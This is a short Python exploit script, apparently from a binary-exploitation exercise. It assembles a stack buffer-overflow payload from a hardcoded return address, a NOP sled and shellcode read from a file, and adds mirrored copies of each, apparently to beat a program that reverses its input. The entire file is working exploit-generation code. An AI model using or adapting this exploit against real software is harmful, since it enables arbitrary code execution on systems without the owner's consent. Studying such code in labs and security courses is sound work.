import sys
ADDR = b'\x7f\xff\xff\xff\xe7\x55' #big endian
PAYLOAD = open('rt.bin', 'rb').read()
DISTANCE = 200

nop_length = int((DISTANCE - len(ADDR) - 2 * len(PAYLOAD)) / 2)

if nop_length < 0:
    raise Exception

nop_sled = b'\x90' * nop_length

final_buffer = ADDR + nop_sled + PAYLOAD + PAYLOAD[::-1] + nop_sled + ADDR[::-1]
sys.stdout.buffer.write(final_buffer)

